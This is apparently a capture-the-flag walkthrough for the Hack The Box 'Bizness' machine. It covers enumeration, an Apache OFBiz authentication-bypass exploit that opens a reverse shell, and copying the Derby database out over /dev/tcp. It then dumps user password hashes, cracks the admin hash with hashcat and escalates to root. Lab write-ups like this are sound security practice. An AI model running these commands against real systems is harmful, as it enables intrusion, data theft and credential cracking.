@@ -1,0 +1,172 @@
+Bizness: Vulnerabilities: Exposed Database data, CVE 49070 and 51467, RCE
+
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.55.98
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp    open  http       nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+443/tcp   open  ssl/http   nginx 1.18.0
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+|_http-title: Did not follow redirect to https://bizness.htb/
+|_http-server-header: nginx/1.18.0
+| tls-nextprotoneg: 
+|_  http/1.1
+36737/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+echo 10.129.55.98 bizness.htb | sudo tee -a /etc/hosts
+
+https://bizness.htb/ 
+
+GET / HTTP/1.1
+Host: bizness.htb
+Cookie: JSESSIONID=E1A826D3213CDC960D8461CDED02A1CB.jvm1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Sec-Gpc: 1
+If-Modified-Since: Mon, 18 Dec 2023 08:18:28 GMT
+If-None-Match: W/"27200-1702887508516"
+Te: trailers
+Connection: close
+
+
+Gobuster wasn’t working, so we used this:
+feroxbuster -k -u https://bizness.htb
+
+We found bizness.htb/content which directed us to a login page:
+https://bizness.htb/content/control/main 
+
+We see this on the webpage:
+
+Copyright (c) 2001-2024 The Apache Software Foundation. Powered by Apache OFBiz. Release 18.12  
+
+
+Found this on google search, but it did not work
+The default administrative account is username: "admin", password: "ofbiz".
+
+https://bizness.htb/content/control/forgotPassword 
+
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49070 
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51467 
+
+https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit 
+
+https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz/blob/main/ofbiz_exploit.py 
+
+We use this exploit above to gain access into the web server
+python3 ofbiz_exploit.py https://bizness.htb/ shell 10.10.14.217:4444
+
+ofbiz@bizness:~$ cat user.txt
+cat user.txt
+7fb25e514c0dd7b895a9583255b9d172
+
+Privilege Escalation:
+
+Let’s get LinPEAS on our target - didn’t find anything really
+
+Let’s try to use local_exploit_suggester
+msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run
+
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.10.0
+ 2   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+ 3   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.9.5p2 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
+
+The above did not seem to work, let’s laterally move through the file system
+
+We see that the system uses apache derby database, so we use netcat to get the database onto our attacker:
+
+We use derby-tools to connect to the data
+
+On attack:
+nc -nlvp 4444 > ofbiz.ta
+
+On victim:
+cd /opt/ofbiz/runtime/data/derby
+tar cvf ofbiz.tar ofbiz
+cat ofbiz.tar > /dev/tcp/10.10.14.59/4444
+
+
+Unzip the tar file on home directory and use ij command to connect to the:
+ij> connect 'jdbc:derby:./ofbiz';
+
+SHOW TABLES;
+SELECT * FROM OFBIZ.USER_LOGIN;
+SELECT USER_LOGIN_ID,CURRENT_PASSWORD FROM OFBIZ.USER_LOGIN;
+
+Admin has a hash of:
+$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+
+
+
+It seems this is SHA256 encryption?
+
+└──╼ [★]$ hashid '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
+Analyzing '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
+[+] Unknown hash
+
+We read around the hashing algorithm python file and we find:
+
+ That the characters are Base64-encoded, but without padding, and with + and / characters replaced by - and _ , respectively.
+
+ Using python, let’s try to reverse engineer:
+>>> enc = "uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
+>>> enc = enc.replace('_', '/')
+>>> enc = enc.replace('-', '+')
+>>> enc
+'uP0/QaVBpDWFeo8+dRzDqRwXQ2I'
+>>> enc += '=' 
+>>> dec = base64.b64decode(enc.encode('utf-8'))
+ >>> dec b'\xb8\xfd?A\xa5A\xa45\x85z\x8f>u\x1c\xc3\xa9\x1c\x17Cb'
+>>> import binascii 
+>>> binascii.hexlify(dec) 
+b'b8fd3f41a541a435857a8f3e751cc3a91c174362'
+
+
+──╼ [★]$ hashid 'b8fd3f41a541a435857a8f3e751cc3a91c174362'
+Analyzing 'b8fd3f41a541a435857a8f3e751cc3a91c174362'
+[+] SHA-1 
+[+] Double SHA-1 
+[+] RIPEMD-160 
+[+] Haval-160 
+[+] Tiger-160 
+[+] HAS-160 
+[+] LinkedIn 
+[+] Skein-256(160) 
+[+] Skein-512(160) 
+
+hashcat -m 120 -a 0 hash /usr/share/wordlists/rockyou.txt.gz 
+
+B8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness
+
+ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ su root
+su root
+Password: monkeybizness
+whoami
+root
+
+cat /root/root.txt
+0d4675af9901af4f661ed85d28ea6da0
+
+Now we have root access:
+
